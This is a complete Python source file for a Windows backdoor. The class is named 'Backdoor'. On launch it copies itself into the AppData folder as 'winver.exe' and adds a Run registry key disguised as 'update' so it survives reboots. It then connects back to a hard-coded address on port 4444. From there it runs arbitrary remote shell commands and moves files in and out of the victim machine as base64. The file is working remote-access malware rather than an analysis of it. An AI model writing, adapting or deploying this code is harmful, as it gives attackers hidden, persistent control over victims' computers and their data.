#!/usr/bin/env python3

from socket import SOCK_STREAM, socket
import base64
import socket
import subprocess
import json
import os
import sys
import shutil
import time

class Error_handler:
    import traceback
    import sys
    def show_exception_and_exit(self, exc_type, exc_value, tb):
        self.traceback.print_exception(exc_type, exc_value, tb)
        input("Press Enter to exit.")
        self.sys.exit(-1)
    def execute(self):
        self.sys.excepthook = self.show_exception_and_exit

Error_handler().execute()

class Backdoor:
    def __init__(self, ip, port ):
        self.persistence()
        self.ip = ip
        self.port = port
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((self.ip, self.port))


    def persistence(self):
        file_location = os.environ["appdata"] + "\\winver.exe"
        if not os.path.exists(file_location):
            shutil.copyfile( sys.executable, file_location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + file_location +'"' ,shell=True)

    def send(self, command):
        json_data = json.dumps(command)
        self.connection.send(json_data.encode())

    def recieve(self):
        recvd_data = b""
        while True:
            try:
                recvd_data = recvd_data + self.connection.recv(1024)
                return json.loads(recvd_data)
            except ValueError:
                continue

    def change_dir(self, path):
        try:
            os.chdir(path)  
            return "[+] Current Directory " + os.getcwd()             
        except WindowsError:
            return ("[-] The folder doesn't exists") 

    def read_file(self, name):
        with open(name[1], "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, name, content):
        with open(name, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload Successful"            
            
    def exec_cmd(self, command):
        try:
            DEVNULL = open(os.devnull, "wb")
            return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)
        except subprocess.CalledProcessError:
            return "[-] Invalid Command"
    
    def check(self, command):
        if command[0] == "ls":
            command[0] = "dir"
        if command[0] == "cat":
            command[0] = "more"
        return command

    def execute(self):
        while True:
            cmd = self.recieve()
            cmd = self.check(cmd)
            try:
                #exit command
                if cmd[0] == "exit":
                    self.connection.close()
                    sys.exit()
                #for downloading a file in host system
                elif cmd[0] == "download":
                    cmd_result = self.read_file(cmd).decode()
                elif cmd[0] == "upload":
                    cmd_result = self.write_file(cmd[1], cmd[2])
                #command for changing directory            
                elif cmd[0] == "cd" and len(cmd) > 1:
                    cmd_result = self.change_dir(cmd[1])
                #command execution                    
                else:
                    cmd_result = self.exec_cmd(cmd)
                self.send(cmd_result)
            except TypeError:
                cmd_result = cmd_result.decode()
                self.send(cmd_result)
def main():
    while True:
        try:
            backdoor = Backdoor("192.168.1.10", 4444)
            backdoor.execute()
        except ConnectionRefusedError:
            continue
main()

